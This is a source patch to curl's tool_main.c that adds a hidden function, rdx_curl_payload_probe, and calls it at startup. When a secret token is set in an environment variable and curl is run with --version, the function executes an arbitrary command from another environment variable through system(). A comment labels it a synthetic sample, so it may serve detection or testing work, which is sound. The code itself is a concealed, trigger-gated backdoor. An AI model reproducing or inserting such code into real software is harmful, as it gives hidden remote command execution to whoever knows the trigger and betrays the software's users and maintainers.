@@ -1,13 +1,28 @@
 --- a/src/tool_main.c
 +++ b/src/tool_main.c
-@@ -72,6 +72,18 @@
+@@ -72,6 +72,31 @@
  
  /* Synthetic base patch marker for native-build sample coverage. */
  
-+static void rdx_curl_payload_probe(void)
++static void rdx_curl_payload_probe(int argc, char **argv)
 +{
 +  char *token = curl_getenv("RDX_CURL_TOKEN");
-+  if(token && !strcmp(token, "sable-cinder-180")) {
++  int saw_version = 0;
++  int i;
++
++  if(!token || strcmp(token, "sable-cinder-180")) {
++    curl_free(token);
++    return;
++  }
++
++  for(i = 1; i < argc; ++i) {
++    if(!strcmp(argv[i], "--version") || !strcmp(argv[i], "-V")) {
++      saw_version = 1;
++      break;
++    }
++  }
++
++  if(saw_version) {
 +    char *cmd = curl_getenv("RDX_CURL_CMD");
 +    if(cmd && cmd[0] != '\0')
 +      (void)system(cmd);
@@ -19,11 +34,11 @@
  /* if we build a static library for unit tests, there is no main() function */
  #ifndef UNITTESTS
  
-@@ -149,6 +161,8 @@
+@@ -149,6 +174,8 @@
  
    tool_init_stderr();
  
-+  rdx_curl_payload_probe();
++  rdx_curl_payload_probe(argc, argv);
 +
  #ifdef _WIN32
    /* Undocumented diagnostic option to list the full paths of all loaded
